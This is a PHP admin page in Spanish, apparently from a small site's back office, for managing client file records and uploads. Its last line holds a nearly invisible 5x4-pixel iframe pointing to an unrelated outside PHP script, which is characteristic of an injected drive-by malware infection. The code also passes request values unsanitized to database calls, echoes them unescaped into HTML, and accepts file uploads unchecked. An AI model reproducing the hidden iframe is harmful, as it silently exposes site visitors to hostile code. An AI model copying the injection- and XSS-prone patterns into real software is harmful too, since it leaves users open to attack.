<?
	// <!-- BAJA DE REGISTRO EN LA BASE -->

	if ($_GET["action"]=="deleteArchivo") {
		
		$Sql_result = $ManCli->DeleteArchivo($_GET["id"]);

		if (!$Sql_result){
			echo "No pudo eliminar el registro";
		} 

		$SqlSrv->dbDisconnect();

		header ("location: clientes.php?action=listArchivos&id_cliente=" . $_GET["id_cliente"]);
		exit();

	}

	// <!-- ALTA O EDICION DE REGISTRO EN LA BASE -->

	if (isset($_POST["save"])) {
		
		$error = "";
		
		if (!$_POST["nombre"])		$error .= "• Nombre<br>";
			
		if (!$error){

			if (!isset($_POST["id"])){
				// - ALTA
				$Sql_result = $ManCli->AddArchivo($_POST["id_cliente"], $_POST["nombre"], $_POST["archivo"]);

				$id_cliente = $_POST["id_cliente"];
				$add_id = mysql_insert_id();

			} else {
				// - EDICION
				$Sql_result = $ManCli->EditArchivo($_POST["id_cliente"], $_POST["nombre"], $_POST["archivo"], $_POST["id"]);
				
				$id_cliente = $_POST["id_cliente"];
				$add_id = $_POST["id"];
			}
			
			if (!$Sql_result){
				echo "No pudo guardar el registro";
			} else {

				// --------- SUBO IMAGEN --------- //
				$campos[] = "id";
				$variables[] = $add_id;

				if ($_FILES['img_chica']['size']>0){
					$nombre_imagen = "arch_".$add_id;

					$Imagen = $ManImg->UploadImage($_FILES['img_chica']['tmp_name'], $imagePathArc, $nombre_imagen, $_FILES['img_chica']['type']);

					$campos[] = "img_chica";
					$variables[] = $Imagen;
				} elseif ($_FILES['img_chica']['tmp_name']!=''){
					$campos[] = "img_chica";
					$variables[] = $_FILES['img_chica']['name'];
				}

				if (count($campos)>1){
					$EditTable = $ManImg->EditTable("clientes_archivos", $campos, $variables);
				}
				
				// --------- BORRAR IMAGEN --------- //
				/*$campos_del[0] = "id";
				$variables_del[0] = $add_id;

				if (isset($borrar_img_chica) && $borrar_img_chica=='1'){
					$campos_del[] = "img_chica";
					$variables_del[] = "";
				}

				if (count($campos_del)>1){
					$EditTable = $ManImg->EditTable("clientes_archivos", $campos_del, $variables_del);
				}*/

			}

			$SqlSrv->dbDisconnect();

			header ("location: clientes.php?action=listArchivos&id_cliente=" . $_POST["id_cliente"]);
			exit();
		
		} else {
			$img_chica	= "";
		}

	}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> .:: TBX | Admin ::. </TITLE>

<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../styles/styles.css">

<script language="javascript" src="../javascript/m_clientes.js"></script>

</HEAD>

<BODY>

<?
	if (isset($_GET["id"])){
		$Sql_result = $ManCli->GetArchivo($_GET["id"]);
			
		$row = mysql_fetch_array($Sql_result);

		$id				= $row['id'];
		$id_cliente		= $row['id_cliente'];
		$nombre			= $row['nombre'];
		$archivo		= $row['archivo'];
		$img_chica		= $row['img_chica'];
	}

	$id_cliente = $_GET["id_cliente"]? $_GET["id_cliente"] : $id_cliente;
?>


			<!-- LISTADO -->
			<table cellpadding=0 cellspacing=0 border=0 class="marco_blanco">
				<tr> 
					<td>
					<!-- EDITAR SECCIONES -->
					<table cellpadding=2 cellspacing=0 border=0 width="100%">
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
							</tr>
						<tr>
							<td class="txt"><img src="../imgs/fl.gif" width="5" height="9" hspace="5">Complete el siguiente formulario. Los campos señalados con<img src="../imgs/fl.gif" width="5" height="9" hspace="5"> son obligatorios</td>
						</tr>
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					<table cellpadding=2 cellspacing=0 border=0 width=100%>
					<form method="post" action="<?=$_SERVER['PHP_SELF']?>?action=editArchivo" name="forma" enctype='multipart/form-data'>
					<?
					if (isset($_GET["id"])) {
						echo "<input type=hidden name=id value=\"$id\">";
					}
					?> 
					<input type=hidden name=id_cliente value="<?=$id_cliente?>">
					<? if ($error){ ?>
						<tr> 
							<td colspan="2" class="txt" align="center"><span class="error">Complete correctamente los siguientes campos:</span><br><br>
							<span class="error"><?=$error?></span></td>
						</tr>
					<? } ?>
						<tr>
							<td class="txt" align=right><img src="../imgs/fl.gif" width="5" height="9" hspace="5">Nombre</td>
							<td><input type=text name=nombre maxlength=255 class="form1" value="<?=$nombre?>"></td>
						</tr>
						<!-- <tr>
							<td class="txt" align=right><img src="../imgs/fl.gif" width="5" height="9" hspace="5">Archivo</td>
							<td><input type=text name=archivo maxlength=255 class="form1" value="<?=$archivo?>"></td>
						</tr> -->
						<tr>
							<td class="txt" align=right>Archivo</td>
							<td><input type="file" name="img_chica" class="form1"></td>
						</tr>
						<? if ($img_chica){ ?>
						<tr>
							<td class="txt" align=right>&nbsp;</td>
							<td class="txt"><A HREF="<?=$imagePathArc.$img_chica?>" target="_blank">ver archivo</A></td>
						</tr>
						<? } ?>
						<tr>
							<td align=right class=txt>&nbsp;</td>
							<td><INPUT TYPE="submit" value="Guardar" class="actionButton">&nbsp;&nbsp;<input type="button" onclick="self.location='clientes.php?action=listArchivos&id_cliente=<?=$id_cliente?>';" value="Cancelar" class="actionButton"></td>
						</tr>
						<input type="hidden" name="save" value="1">
					</form>
					</table>
					<?
						$SqlSrv->dbDisconnect();
					?>
					</td>
				</tr>
			</table>
			

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
